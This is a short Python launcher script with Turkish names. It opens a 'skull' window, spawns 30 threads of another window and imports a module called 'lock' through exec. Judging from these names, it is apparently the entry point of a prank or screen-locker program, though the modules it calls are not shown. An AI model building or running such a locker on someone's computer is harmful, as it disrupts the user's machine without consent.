import first
from threading import Thread
import _thread


def Yazilar():
    first.kafatasiSekmesi()
    for i in range(0, 30):
        Thread(target= first.aciklamaSekmesi).start()


def Lock():
    exec("import lock")

Thread(target=Lock).start()
Thread(target=Yazilar).start()


